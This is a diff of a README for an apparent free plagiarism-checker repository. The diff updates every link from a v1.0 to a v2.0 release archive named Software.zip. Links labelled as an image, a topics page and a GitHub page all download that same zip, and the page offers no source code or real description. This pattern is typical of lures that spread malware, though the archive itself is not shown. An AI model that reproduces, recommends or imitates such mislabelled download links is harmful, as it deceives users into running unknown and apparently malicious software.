@@ -4,7 +4,7 @@
 
 Are you tired of dealing with plagiarism issues? Look no further! Our "Plagiarism-Checker-Free" repository offers a comprehensive solution to help you detect and prevent plagiarism in your writing. Whether you are a teacher checking students' essays or a writer ensuring the originality of your content, this tool is a must-have in your toolkit.
 
-![Plagiarism Checker](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v1.0/Software.zip)
+![Plagiarism Checker](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v2.0/Software.zip)
 
 ## 📝 Repository Description
 
@@ -12,9 +12,9 @@ This repository provides a powerful grammar plagiarism checker that enables you 
 
 ## 🚀 Quick Start
 
-To get started with our plagiarism checker, simply [click here to download the tool](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v1.0/Software.zip). 
+To get started with our plagiarism checker, simply [click here to download the tool](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v2.0/Software.zip). 
 
-[![Download Plagiarism Checker](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v1.0/Software.zip%20Checker-blue)](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v1.0/Software.zip)
+[![Download Plagiarism Checker](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v2.0/Software.zip%20Checker-blue)](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the tool and start checking for plagiarism with ease.
 
@@ -39,13 +39,13 @@ Once downloaded, launch the tool and start checking for plagiarism with ease.
 
 ## 🌐 Explore More
 
-Visit our [repository topics page](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v1.0/Software.zip) to delve deeper into the world of plagiarism checking and grammar analysis.
+Visit our [repository topics page](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v2.0/Software.zip) to delve deeper into the world of plagiarism checking and grammar analysis.
 
 Need more resources or want to contribute? Check out the "Releases" section for the latest updates and enhancements.
 
 ## 📡 Stay Connected
 
-Stay connected with us on our [GitHub page](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v1.0/Software.zip) for the latest news, updates, and community discussions.
+Stay connected with us on our [GitHub page](https://github.com/HegnerCarvalho/Plagiarism-Checker-Free/releases/download/v2.0/Software.zip) for the latest news, updates, and community discussions.
 
 Let's join forces to combat plagiarism and uphold the value of original content creation! 🛡️💡
 
